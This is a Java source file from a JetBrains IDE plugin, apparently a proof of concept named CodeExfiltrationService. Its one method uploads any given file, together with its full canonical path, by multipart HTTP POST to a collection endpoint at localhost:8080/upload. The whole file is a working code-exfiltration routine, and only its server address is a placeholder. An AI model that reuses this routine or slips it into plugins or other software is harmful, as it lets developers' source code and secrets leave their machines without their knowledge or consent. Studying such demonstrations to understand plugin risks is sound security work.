package com.chriscarini.jetbrains.codeexfiltration.services;

import com.intellij.openapi.application.ApplicationManager;
import com.intellij.openapi.diagnostic.Logger;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.HttpClientBuilder;

import java.io.File;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;

public class CodeExfiltrationService {
    private static final Logger LOG = Logger.getInstance(CodeExfiltrationService.class);

    public static CodeExfiltrationService getInstance() {
        return ApplicationManager.getApplication().getComponent(CodeExfiltrationService.class);
    }

    public void sendFile(final File file) {
        LOG.warn("Trying to send file: " + file.getName());
        // Connect to the web server endpoint
        final URL serverUrl;
        final String url = "http://localhost:8080/upload";
        try {
            serverUrl = new URL(url);
        } catch (final MalformedURLException e) {
            LOG.error("Bad URL specified to upload file: " + url, e);
            return;
        }

        final URI serverUri;
        try {
            serverUri = serverUrl.toURI();
        } catch (final URISyntaxException e) {
            LOG.error(e);
            return;
        }
        final String filePath;
        try {
            filePath = file.getCanonicalPath();
        } catch (final IOException e) {
            LOG.error("Unable to get canonical file path.", e);
            return;
        }

        final HttpClient client = HttpClientBuilder.create().build();
        final MultipartEntityBuilder entity = MultipartEntityBuilder.create();
        final HttpPost post = new HttpPost(serverUri);
        entity.addPart("file", new FileBody(file));
        entity.addPart("path", new StringBody(filePath, ContentType.TEXT_PLAIN));
        post.setEntity(entity.build());
        try {
            final HttpResponse response = client.execute(post);
        } catch (final IOException e) {
            LOG.error("IOException while trying to execute POST request", e);
        }
    }
}
